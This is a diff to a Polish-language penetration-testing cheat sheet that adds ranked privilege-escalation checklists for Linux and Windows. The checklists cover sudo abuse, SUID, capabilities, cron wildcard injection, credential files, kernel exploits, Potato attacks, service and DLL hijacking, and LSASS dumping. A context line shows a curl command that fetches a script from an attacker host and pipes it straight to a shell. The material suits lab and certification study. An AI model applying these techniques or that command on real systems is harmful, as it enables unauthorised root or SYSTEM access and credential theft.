@@ -1126,6 +1126,16 @@ curl http://$LHOST:8000/linpeas.sh | sh
 > - **Sekcje, w które celujesz (Linux):** `SUID` · `Capabilities` · `Sudo` (`sudo -l`) · `Cron jobs` · `Writable files/folders` · `Kernel Exploits (CVE)` · `Creds` (hasła w plikach/historii).
 > - **winPEAS (Windows), sekcje:** `whoami /priv` (SeImpersonate!) · `Services` (unquoted/weak perms) · `AlwaysInstallElevated` · `Stored Credentials` (cmdkey/Registry) · `Scheduled Tasks` · `AutoLogon`.
 > - ⚠️ Peas to **skaner tropów, nie dowód** — potwierdź ręcznie każdy znaleziony wektor. I odpal też manualne checki (niżej), bo peas nie łapie custom-binarek/logiki.
+>
+> **🥇 Priorytety Linux (co daje roota najczęściej — patrz w tej kolejności):**
+> 1. **`sudo -l`** — cokolwiek `NOPASSWD` lub znane z GTFOBins = często 1 komenda do roota. ZAWSZE pierwsze.
+> 2. **SUID nietypowe** — custom binarka → PATH hijack (§4.1); znana → GTFOBins „SUID".
+> 3. **Capabilities** — `cap_setuid+ep` na perl/python/ruby = instant root (`getcap -r /`).
+> 4. **Cron / timery jako root** — zapisywalny skrypt, **wildcard injection**, zapisywalny `$PATH`. Potwierdź `pspy` (widzisz co odpala root bez bycia rootem).
+> 5. **Zapisywalne pliki, które root czyta/wykonuje** — `/etc/passwd` (dopisz roota), `sudoers`, unit usługi, skrypt z crona.
+> 6. **Creds w plikach** — configi (`.env`, `wp-config.php`, db), `.bash_history`, `.ssh/id_rsa`, backupy `*.bak`. Znalezione hasło → `su`/reuse na inne konta.
+> 7. **Kernel exploit (CVE)** — DirtyPipe/PwnKit/Baron Samedit/DirtyCow. **OSTATECZNOŚĆ** (może wywalić maszynę — rób na końcu).
+> 8. **Grupy (`id`)** — `docker`,`lxd`,`disk`,`adm`,`shadow` → GTFOBins „Groups".
 
 ### System
 ```bash
@@ -1177,6 +1187,15 @@ lsmod                                                 # załadowane moduły
 # winPEAS.exe / winPEASany.exe  |  PowerUp.ps1 (Invoke-AllChecks)  |  Seatbelt.exe
 .\winPEASx64.exe
 ```
+> **🥇 Priorytety Windows (co daje SYSTEM najczęściej — patrz w tej kolejności):**
+> 1. **`whoami /priv`** — `SeImpersonatePrivilege`/`SeAssignPrimaryToken` → **Potato → SYSTEM** (§4.2). `SeBackup`/`SeRestore` → dump SAM. `SeDebug` → LSASS. **Konta serwisowe (IIS/MSSQL/FreeSWITCH) prawie zawsze mają SeImpersonate** — to najczęstsza droga na labach.
+> 2. **Usługi** — unquoted service path · słaba ACL binarki (możesz nadpisać `.exe`) · słaba ACL usługi (`sc config binPath=`). Automat: PowerUp `Invoke-AllChecks`.
+> 3. **AlwaysInstallElevated** — gdy OBA klucze (HKLM+HKCU) = 1 → dowolny MSI jako SYSTEM (§4.2).
+> 4. **Zapisane creds** — `cmdkey /list` · autologon w rejestrze · `unattend.xml`/`sysprep.xml` · GPP `Groups.xml` · historia PowerShell · zapisane sesje RDP/WinSCP/PuTTY.
+> 5. **Scheduled tasks** — zadanie jako SYSTEM z zapisywalnym skryptem/binarką.
+> 6. **DLL hijacking** — zapisywalny katalog w `PATH` lub brakująca DLL ładowana przez uprzywilejowany proces.
+> 7. **Zainstalowany soft / procesy jako SYSTEM** — wersja → `searchsploit` (lokalny CVE).
+> 8. **Grupy (`whoami /groups`)** — członek `Backup Operators`/`Server Operators`/`DnsAdmins` = osobne ścieżki na admina.
 
 ### Kto i gdzie (użytkownik, host, uprawnienia)
 ```cmd
